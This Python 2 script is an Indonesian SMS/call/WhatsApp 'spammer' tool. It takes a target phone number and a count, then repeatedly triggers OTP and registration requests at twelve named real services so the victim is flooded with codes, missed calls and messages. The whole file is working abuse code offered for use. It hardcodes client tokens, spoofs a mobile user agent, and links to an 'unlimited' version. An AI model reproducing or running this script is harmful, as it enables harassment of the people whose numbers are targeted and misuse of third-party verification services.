import requests, json, os, sys, random
#-------------------------------Warna---------------------------------------------------
qu = '\033[0;36m'
hi = '\033[0;32m'
pu = '\033[0;37m'
me = '\033[0;31m'
ku = '\033[0;33m'
#--------------------------------Penkodisian-------------------------------------------
def sukses(no1,pro,nam):
  print "     %s[%s%s%s] [%s Sent %s] %sSuccess, spam %s from %s%s %ssended"%(pu,ku,no1,pu,hi,pu,pu,pro,ku,nam,hi)
def gagal(no1,pro,nam):
  print "     %s[%s%s%s] [%s Failed  %s] %sFailed, spam %s from %s%s %snot sended"%(pu,ku,no1,pu,me,pu,pu,pro,ku,nam,me)
#--------------------------------MAIN---------------------------------------------------
def main():
  print "%s[%s!%s] %sTarget locked >> %s%s"%(pu,me,pu,pu,ku,"+62"+nom)
  t = 1
  for spam in range(jum):
   print "%s[%s+%s]-------------------------->>>[%s%s%s]<<<--------------------------[%s+%s]"%(pu,ku,pu,me,t,pu,ku,pu)
   t += 1
   asakita();sunchila();nutriclub();asani();wintershop();datesy();thaifriendly();jumpstart();kinimart();klikwa();bakmikeraton();kopidulukala()
#--------------------------------Banner/LOGO------------------------------------------
def logo():
  print """%s
  _ ___   ___                                   
 / |_  ) / __|_ __  __ _ _ __  _ __  ___ _ _ ___ %sAuthor by %sabilseno11%s
 | |/ /  \__ \ '_ \/ _` | '  \| '  \/ -_) '_(_-< %sGithub %sgithub.com/AbilSeno%s
 |_/___| |___/ .__/\__,_|_|_|_|_|_|_\___|_| /__/ %sTeam %sanoncybfakeplayer%s
             |_|                                 %s13 Spammers (SMS,Call,WA)"""%(qu,pu,ku,qu,pu,ku,qu,pu,ku,qu,qu)
#-------------------------------Input Function------------------------------------------
def input():
  global nom
  nom = raw_input("%s[%s?%s] %sMasukkan nomor target (8888xx) : "%(pu,me,pu,pu))
  if len(nom) < 5:
    print "%s[%s!%s] %sMasukkan nomor target dengan benar!!"%(pu,me,pu,me)
    input()
  else:
    global jum
    jum = int(raw_input("%s[%s?%s] %sMasukkan jumlah spam : "%(pu,me,pu,pu)))
    main()
#-------------------------------SPAM Function-------------------------------------------
def asakita():
  data={'username':'62'+nom}
  h = requests.post("https://www.asakita.id/api/auth/register/otp",headers={'User-Agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36','Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'},data=data).text
  if 'MOBILE' in h:
   sukses("1","sms","asakita")
  else:
   gagal("1","sms","asakita")
def sunchila():
  hih = requests.get("https://m.sunchila.com/api/generateAuthCode.ajax?mobile=0"+nom+"&countryCode=62")
  if json.loads(hih.text)["result"] == 'true':
   sukses("2","sms","sunchila")
  else:
   gagal("2","sms","sunchila")
def nutriclub():
  h = requests.post("https://www.nutriclub.co.id/otp/?phone=0"+nom+"&old_phone=0"+nom,headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'})
  if json.loads(h.text)["StatusMessage"] == 'Request misscall berhasil':
   sukses("3","call","nutriclub")
  else:
   gagal("3","call","nutriclub")
def asani():
  j = requests.post("https://api.asani.co.id/api/v1/send-otp",headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'},data=json.dumps({"phone":"62"+nom,"email":"akuntesnuyul@gmail.com"}))
  if json.loads(j.text)["message"] == 'OTP Terkirim ':
   sukses("4","sms","asani")
  else:
   gagal("4","sms","asani")
def wintershop():
 dat=json.dumps(["62"+nom,"Winter Shop","",""])
 tes = requests.post("https://api.winter-api.com/account/sendmobilecodeasync.json",headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'},data=dat)
 if json.loads(tes.text)["message"] == None:
  sukses("5","call","wintershop")
 else:
  gagal("5","call","wintershop")
def datesy():
 to = requests.post("https://www.datesy.com/",headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'},data={'z':'phonelogingetpin','country':'62','number':nom,'ppclienttoken':'f61627ef220c356b6bf10e28a948c5e6'})
 if json.loads(to.text)["success"] == True:
  sukses("6","sms","datesy")
 else:
  gagal("6","sms","datesy")
def thaifriendly():
 tes = requests.post("https://www.thaifriendly.com/pl/index.php",headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'},data={'z':'phonelogingetpin','country':'62','number':nom,'ppclienttoken':'igq39qdc9rwk2ax1zrgdq'})
 if json.loads(tes.text)["success"] == True:
  sukses("7","sms","thaifriendly")
 else:
  gagal("7","sms","thaifriendly")
def jumpstart():
 dat=json.dumps({"operationName":"CheckPhoneNoAndGenerateOtpIfNotExist","variables":{"phoneNo":"+62"+nom},"query":"query CheckPhoneNoAndGenerateOtpIfNotExist($phoneNo: String!) {\n  checkPhoneNoAndGenerateOtpIfNotExist(phoneNo: $phoneNo)\n}\n"})
 tes=requests.post("https://api.jumpstart.id/graphql",headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36','content-type':'application/json'},data=dat)
 if json.loads(tes.text)["data"] == None:
  gagal("8","sms","jumpstart")
 else:
  sukses("8","sms","jumpstart")
def kinimart():
 tem = requests.post("https://kinimart.com/services/identity/requestOTP",headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'},data={'destination':'0'+nom,'otpLength':'6'})
 if json.loads(tem.text)["IsSuccess"] == True:
  sukses("9","wa","kinimart")
 else:
  gagal("9","wa","kinimart")
def klikwa():
 dat=json.dumps({"number":"+62"+nom,"auth_key":"B33FR33OTP"})
 tes = requests.post("https://api.klikwa.net/v1/number/sendotp",headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'},data=dat)
 if json.loads(tes.text)["message"] == 'OTP Sent':
  print "     %s[%s%s%s] [%s Sent %s] %sSuccess, spam %s from %s%s %ssended %s>> %sMau yang unlimited? %shttps://github.com/AbilSeno/WaUnlimitedV3"%(pu,ku,"10",pu,hi,pu,pu,"wa",ku,"klikwa",hi,qu,pu,ku)
 else:
  print "     %s[%s%s%s] [%s Failed %s] %sFailed, spam %s from %s%s %snot sended %s>> %sMau yang unlimited? %shttps://github.com/AbilSeno/WaUnlimitedV3"%(pu,ku,"10",pu,me,pu,pu,"wa",ku,"klikwa",me,qu,pu,ku)
def bakmikeraton():
 huh = requests.post("https://www.bakmikeraton.com/services/identity/requestOTP",headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'},data={'destination':'0'+nom,'otpLength':'6'})
 if json.loads(huh.text)["IsSuccess"] == True:
  sukses("11","wa","bakmikeraton")
 else:
  gagal("11","wa","bakmikeraton")
def kopidulukala():
 huh = requests.post("https://kopidulukala.com/services/identity/requestOTP",headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'},data={'destination':'0'+nom,'otpLength':'6'})
 if json.loads(huh.text)["IsSuccess"] == True:
  sukses("12","wa","kopidulukala")
 else:
  gagal("12","wa","kopidulukala")
if __name__ == '__main__':
 try:
  os.system("clear")
  logo()
  input()
 except KeyboardInterrupt: print "\r%s[%s!%s] %sExit"%(pu,me,pu,pu)
 except requests.exceptions.ConnectionError: exit("%s[%s!%s] %sConnection Error..."%(pu,me,pu,me))
